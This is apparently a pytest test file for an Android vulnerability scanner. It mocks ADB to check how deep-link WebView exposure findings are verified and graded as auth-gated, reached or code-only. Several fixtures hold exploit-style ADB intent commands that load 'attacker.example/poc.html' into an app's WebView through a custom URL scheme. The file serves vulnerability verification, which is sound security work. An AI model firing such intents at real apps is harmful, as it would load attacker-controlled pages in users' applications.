"""Tests for the ADB-backed Djini truth engine."""
from __future__ import annotations

import asyncio
from types import SimpleNamespace

from sentinel.core.finding import Finding, Severity
from sentinel.tools.adb_runner import AdbCommandResult, AdbRunner, RuntimeResult
from sentinel.tools.result import ToolResult
from sentinel.verify.proof_gate import apply_runtime_result


def _finding(**overrides) -> Finding:
    data = {
        "agent_id": "P_015",
        "vuln_class": "Deep Link WebView Exposure",
        "severity": Severity.HIGH,
        "confidence": 0.9,
        "evidence": {"package": "com.example.app"},
        "recommendation": "Require auth and validate deep-link URLs.",
        "session_id": "truthsess1",
    }
    data.update(overrides)
    return Finding(**data)


def test_verify_deep_link_marks_auth_gate_and_captures_screenshot(tmp_path):
    runner = AdbRunner()
    calls: list[list[str]] = []

    async def fake_run(args, serial=None, timeout=None):
        calls.append(args)
        if args[:4] == ["shell", "am", "start", "-W"]:
            return ToolResult.ok(
                AdbCommandResult(
                    stdout="Status: ok\nActivity: com.example.app/.LoginActivity",
                    stderr="",
                    exit_code=0,
                ),
            )
        return ToolResult.ok(
            AdbCommandResult(
                stdout=(
                    "mResumedActivity: ActivityRecord{abc "
                    "com.example.app/.LoginActivity}"
                ),
                stderr="",
                exit_code=0,
            ),
        )

    async def fake_capture(package_name, session_id, **kwargs):
        assert package_name == "com.example.app"
        assert session_id == "truthsess1"
        return ToolResult.ok("evidence/login_block.png")

    runner._run_adb = fake_run  # type: ignore[method-assign]
    runner.capture_auth_block = fake_capture  # type: ignore[method-assign]

    result = asyncio.run(
        runner.verify_deep_link(
            "com.example.app",
            "mhlcrypto",
            "https://attacker.example/poc.html",
            "truthsess1",
            workspace=tmp_path,
            settle_seconds=0,
        ),
    )

    assert result.success
    assert isinstance(result.data, RuntimeResult)
    assert result.data.is_auth_gated is True
    assert result.data.target_reached is False
    assert result.data.observed_result == "Activity: com.example.app/.LoginActivity"
    assert result.data.blocking_state_screenshot == "evidence/login_block.png"
    assert calls[0][:8] == [
        "shell", "am", "start", "-W",
        "-a", "android.intent.action.VIEW", "-d",
        "mhlcrypto://showPage?url=https://attacker.example/poc.html",
    ]


def test_verify_deep_link_marks_target_reached_with_verified_screenshot(tmp_path):
    runner = AdbRunner()
    auth_capture = SimpleNamespace(called=False)
    verified_capture = SimpleNamespace(called=False)

    async def fake_run(args, serial=None, timeout=None):
        if args[:4] == ["shell", "am", "start", "-W"]:
            return ToolResult.ok(AdbCommandResult(stdout="Status: ok", stderr="", exit_code=0))
        return ToolResult.ok(
            AdbCommandResult(
                stdout=(
                    "mCurrentFocus=Window{123 u0 "
                    "com.example.app/.DWebViewActivity}"
                ),
                stderr="",
                exit_code=0,
            ),
        )

    async def fake_capture(*args, **kwargs):
        auth_capture.called = True
        return ToolResult.ok("evidence/login_block.png")

    async def fake_verified_capture(*args, **kwargs):
        verified_capture.called = True
        return {"path": "evidence/screenshots/verified.png"}

    runner._run_adb = fake_run  # type: ignore[method-assign]
    runner.capture_auth_block = fake_capture  # type: ignore[method-assign]
    runner.capture_screenshot = fake_verified_capture  # type: ignore[method-assign]

    result = asyncio.run(
        runner.verify_deep_link(
            "com.example.app",
            "mhlcrypto",
            "https://attacker.example/poc.html",
            "truthsess1",
            workspace=tmp_path,
            settle_seconds=0,
        ),
    )

    assert result.success
    assert result.data
    assert result.data.target_reached is True
    assert result.data.is_auth_gated is False
    assert result.data.blocking_state_screenshot is None
    assert result.data.verification_screenshot == "evidence/screenshots/verified.png"
    assert auth_capture.called is False
    assert verified_capture.called is True


def test_verify_deep_link_auth_preflight_blocks_before_intent(tmp_path):
    runner = AdbRunner()
    calls: list[list[str]] = []

    class FakeCredentialManager:
        async def auto_login(self, package_name, *, frida=None):
            assert package_name == "com.example.app"
            return SimpleNamespace(
                succeeded=False,
                reason="TokenManager.getToken() returned null",
            )

    async def fake_run(args, serial=None, timeout=None):
        calls.append(args)
        if args[:4] == ["shell", "am", "start", "-W"]:
            raise AssertionError("exploit intent must not fire before login")
        return ToolResult.ok(
            AdbCommandResult(
                stdout=(
                    "mResumedActivity: ActivityRecord{abc "
                    "com.example.app/.LoginActivity}"
                ),
                stderr="",
                exit_code=0,
            ),
        )

    async def fake_capture(package_name, session_id, **kwargs):
        return ToolResult.ok("evidence/login_block.png")

    runner._run_adb = fake_run  # type: ignore[method-assign]
    runner.capture_auth_block = fake_capture  # type: ignore[method-assign]

    result = asyncio.run(
        runner.verify_deep_link(
            "com.example.app",
            "mhlcrypto",
            "https://attacker.example/poc.html",
            "truthsess1",
            workspace=tmp_path,
            require_auth=True,
            credential_manager=FakeCredentialManager(),
            settle_seconds=0,
        ),
    )

    assert result.success
    assert result.data
    assert result.data.command == ""
    assert result.data.is_auth_gated is True
    assert result.data.test_credentials_used is True
    assert "TokenManager.getToken() returned null" in result.data.observed_result
    assert all(call[:4] != ["shell", "am", "start", "-W"] for call in calls)


def test_verify_component_builds_command_and_captures_verified_screenshot(tmp_path):
    runner = AdbRunner()

    async def fake_run(args, serial=None, timeout=None):
        if args[:4] == ["shell", "am", "start", "-W"]:
            assert args == [
                "shell", "am", "start", "-W",
                "-n", "com.example.app/.DWebViewActivity",
                "-a", "android.intent.action.VIEW",
                "-d", "app://load?url=https://attacker.example/poc.html",
            ]
            return ToolResult.ok(AdbCommandResult(stdout="Status: ok", stderr="", exit_code=0))
        return ToolResult.ok(
            AdbCommandResult(
                stdout=(
                    "mCurrentFocus=Window{123 u0 "
                    "com.example.app/.DWebViewActivity}"
                ),
                stderr="",
                exit_code=0,
            ),
        )

    async def fake_verified_capture(*args, **kwargs):
        return {"path": "evidence/screenshots/component_verified.png"}

    runner._run_adb = fake_run  # type: ignore[method-assign]
    runner.capture_screenshot = fake_verified_capture  # type: ignore[method-assign]

    result = asyncio.run(
        runner.verify_component(
            "com.example.app",
            ".DWebViewActivity",
            "truthsess1",
            workspace=tmp_path,
            action="android.intent.action.VIEW",
            data_uri="app://load?url=https://attacker.example/poc.html",
            settle_seconds=0,
        ),
    )

    assert result.success
    assert result.data
    assert result.data.target_reached is True
    assert result.data.command == (
        "adb shell am start -W -n com.example.app/.DWebViewActivity "
        "-a android.intent.action.VIEW "
        "-d app://load?url=https://attacker.example/poc.html"
    )
    assert result.data.verification_screenshot == (
        "evidence/screenshots/component_verified.png"
    )


def test_apply_runtime_result_is_deterministic_for_auth_gated():
    runtime = RuntimeResult(
        command=(
            "adb shell am start -W -a android.intent.action.VIEW "
            "-d mhlcrypto://showPage?url=https://attacker.example com.example.app"
        ),
        stdout="Status: ok",
        stderr="",
        exit_code=0,
        observed_result="Activity: com.example.app/.LoginActivity",
        resumed_activity="com.example.app/.LoginActivity",
        target_reached=False,
        is_auth_gated=True,
        blocking_state_screenshot="evidence/login_block.png",
    )

    updated = apply_runtime_result(_finding(), runtime)

    assert updated.verification_status == "Auth_Gated"
    assert updated.verification_state == "auth_gated"
    assert updated.exploitation_status == "Auth_Gated"
    assert updated.finding_category == "AI-Powered"
    assert updated.observed_result == "Activity: com.example.app/.LoginActivity"
    assert updated.blocking_state_screenshot == "evidence/login_block.png"
    assert updated.reproduction_commands == [runtime.command]
    assert updated.screenshots
    assert updated.screenshots[0]["label"] == "auth_gated"


def test_apply_runtime_result_none_is_code_only():
    updated = apply_runtime_result(_finding(), None)

    assert updated.verification_status == "Code_Only"
    assert updated.verification_state == "code_only"
    assert updated.exploitation_status == "Code_Only"


def test_finding_accepts_dynamic_target_without_static_reproduction_command():
    finding = _finding(dynamic_target={
        "type": "deep_link",
        "scheme": "mhlcrypto",
        "path": "showPage",
        "param": "url",
        "requires_auth": True,
    })

    assert finding.dynamic_target["type"] == "deep_link"
    assert finding.reproduction_commands == []
